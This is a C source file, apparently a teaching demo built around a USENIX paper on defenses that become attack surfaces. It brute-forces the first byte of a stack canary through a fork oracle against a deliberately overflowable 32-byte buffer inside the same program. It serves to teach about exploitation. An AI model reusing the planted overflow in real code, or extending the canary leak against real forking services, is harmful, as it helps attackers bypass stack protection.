/*
 * Simplified "defense as attack surface" demo for Compiler Explorer / Godbolt.
 *
 * Stops after leaking canary[0] only (~256 forks worst case; glibc uses 0x00
 * for byte 0 so usually 1 fork). Full attack: 8 * 256 forks for the whole
 * canary — see 07_defense_as_attack_surface.c.
 *
 * Paper analog: "When Good Kernel Defenses Go Bad" (USENIX Security 2025) —
 * a hardening feature adds an observable (here: clean exit vs __stack_chk_fail).
 *
 * x86_64 Linux, glibc, -O0 -fstack-protector-strong
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

__attribute__((noinline))
static void vulnerable_copy(const uint8_t *input, size_t n)
{
    uint8_t buf[32];
    for (volatile size_t i = 0; i < n; i++)
        buf[i] = input[i];
    volatile uint8_t sink = buf[0];
    (void)sink;
}

/* buf[0..31] + 8 pad bytes to canary[0] at rbp-0x8 => 40 bytes */
#define CANARY_OFFSET 40

static void child_run(int fd) __attribute__((noreturn));
static void child_run(int fd)
{
    int d = open("/dev/null", O_WRONLY);
    if (d >= 0) {
        dup2(d, STDERR_FILENO);
        close(d);
    }

    uint32_t len;
    if (read(fd, &len, sizeof(len)) != (ssize_t)sizeof(len))
        _exit(2);

    uint8_t payload[256];
    if (len > sizeof(payload))
        _exit(2);
    size_t got = 0;
    while (got < len) {
        ssize_t r = read(fd, payload + got, len - got);
        if (r <= 0)
            _exit(2);
        got += (size_t)r;
    }

    vulnerable_copy(payload, len);
    _exit(0);
}

/* Returns 1 if child exits 0 (canary prefix matched). */
static int probe_first_canary_byte(uint8_t guess)
{
    int pfd[2];
    if (pipe(pfd) != 0) {
        perror("pipe");
        exit(1);
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        close(pfd[1]);
        child_run(pfd[0]);
    }
    close(pfd[0]);

    uint32_t total = CANARY_OFFSET + 1;
    uint8_t head[CANARY_OFFSET];
    memset(head, 'A', sizeof(head));

    if (write(pfd[1], &total, sizeof(total)) != (ssize_t)sizeof(total) ||
        write(pfd[1], head, sizeof(head)) != (ssize_t)sizeof(head) ||
        write(pfd[1], &guess, 1) != 1) {
        _exit(1);
    }
    close(pfd[1]);

    int st;
    waitpid(pid, &st, 0);
    return WIFEXITED(st) && WEXITSTATUS(st) == 0;
}

static uint8_t true_canary_byte0(void)
{
#if defined(__x86_64__)
    uint64_t v;
    __asm__("mov %%fs:0x28, %0" : "=r"(v));
    return (uint8_t)v;
#else
    return 0;
#endif
}

int main(void)
{
    printf("fork oracle: first canary byte only (CE-friendly demo)\n\n");

    uint8_t truth = true_canary_byte0();
    printf("ground truth canary[0] = 0x%02x (glibc uses 0x00)\n\n", truth);

    int probes = 0;
    int found = -1;
    for (int g = 0; g < 256; g++) {
        probes++;
        if (probe_first_canary_byte((uint8_t)g)) {
            found = g;
            break;
        }
    }

    if (found < 0) {
        fputs("no byte matched (wrong CANARY_OFFSET / not Linux?)\n", stderr);
        return 1;
    }

    printf("leaked canary[0]     = 0x%02x  (%d probe(s))\n", found, probes);
    printf("match                = %s\n", found == (int)truth ? "yes" : "no");
    return found == (int)truth ? 0 : 1;
}
